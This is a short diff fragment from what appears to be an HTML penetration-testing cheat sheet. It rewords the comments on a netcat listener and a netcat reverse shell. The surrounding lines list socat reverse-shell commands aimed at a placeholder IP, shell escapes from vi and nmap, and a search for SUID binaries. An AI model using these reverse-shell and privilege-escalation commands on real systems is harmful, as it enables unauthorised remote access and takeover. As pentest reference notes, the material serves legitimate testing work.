@@ -38,8 +38,8 @@ in vi editor - :set shell=/bin/bash:shell<br>
 in nmap - !sh<br>
 socat file:`tty`,raw,echo=0 tcp-listen:666<br>
 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:xxx.xxx.xxx.xxx:666<br>
-nc -lnvp 666 #listener <br>
-nc ip port –e /bin/bash #reverse shell netcat needs to be upgraded with above shells. </p>
+nc -lnvp 666 #listener netcat needs to be upgraded with above shells. <br>
+nc ip port –e /bin/bash #reverse shell overused </p>
 
 <h3>#Linux permission search</h3>
 <p>find /usr/bin/ -perm -u=s # set uids <br>
